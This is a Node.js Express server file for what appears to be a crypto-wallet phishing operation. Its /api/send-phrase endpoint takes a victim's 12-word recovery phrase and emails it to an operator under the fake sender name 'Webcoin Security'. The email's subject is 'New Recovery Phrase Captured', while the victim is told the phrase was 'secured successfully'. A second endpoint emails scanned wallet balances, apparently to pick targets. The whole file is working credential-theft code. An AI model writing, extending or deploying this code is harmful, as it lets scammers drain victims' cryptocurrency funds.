const express = require("express");
const cors = require("cors");
const sgMail = require("@sendgrid/mail");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json());

sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// Existing endpoint for phrases
app.post("/api/send-phrase", async (req, res) => {
  const { words } = req.body;

  if (!words || words.length !== 12) {
    return res.status(400).json({ message: "Invalid phrase" });
  }

  const msg = {
    to: process.env.DEST_EMAIL,
    from: {
      email: process.env.FROM_EMAIL,
      name: "Webcoin Security"
    },
    subject: "New Recovery Phrase Captured",
    text: `Phrase: ${words.join(" ")}`,
  };

  try {
    await sgMail.send(msg);
    return res.json({ message: "secured successfully!" });
  } catch (error) {
    console.log("SENDGRID ERROR:", error.response?.body?.errors || error);
    return res.status(500).json({ error: "secure failed" });
  }
});

// NEW endpoint for sending scanned wallet data
app.post("/api/send-wallet", async (req, res) => {
  const { address, results } = req.body;

  if (!address || !results || !Array.isArray(results)) {
    return res.status(400).json({ message: "Invalid wallet data" });
  }

  // Format wallet results into readable text
  let walletText = `Wallet Address: ${address}\n\nBalances:\n`;
  results.forEach((item) => {
    walletText += `${item.chain} - ${item.native.balance} ${item.native.symbol}\n`;
    if (item.tokens.length > 0) {
      item.tokens.forEach((t) => {
        walletText += `  ${t.symbol}: ${t.balance}\n`;
      });
    }
    walletText += "\n";
  });

  const msg = {
    to: process.env.DEST_EMAIL,
    from: {
      email: process.env.FROM_EMAIL,
      name: "Webcoin Security"
    },
    subject: `Wallet Scan Result: ${address}`,
    text: walletText,
  };

  try {
    await sgMail.send(msg);
    return res.json({ message: "Wallet results sent successfully!" });
  } catch (error) {
    console.log("SENDGRID ERROR:", error.response?.body?.errors || error);
    return res.status(500).json({ error: "Failed to send wallet data" });
  }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on ${PORT}`));
